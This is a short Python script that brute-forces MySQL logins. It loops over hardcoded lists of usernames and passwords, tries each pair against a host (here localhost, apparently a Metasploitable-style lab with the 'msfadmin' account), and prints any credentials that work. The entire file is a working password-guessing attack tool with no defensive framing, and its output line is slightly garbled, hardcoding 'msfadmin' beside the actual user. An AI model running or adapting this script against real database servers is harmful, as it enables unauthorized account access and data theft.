import mysql.connector as mysql
def BruteForce(host:str,usernames:list,passwords:list):
    for user in usernames:
        for password in passwords:
            try:
                connection = mysql.connect(host=host, user=user, password=password)
                print(f"ACCOUNT FOUND: [MySQL] Host: {host} User: msfadmin {user} Password: {password}")
                break
            except:
                pass
users = ["msfadmin", "Ahmed", "Salim"]
passwords = ["46677368", "5635hdt56", "pass565", "sa55ehjs"]
BruteForce(host="localhost", usernames=users, passwords=passwords)
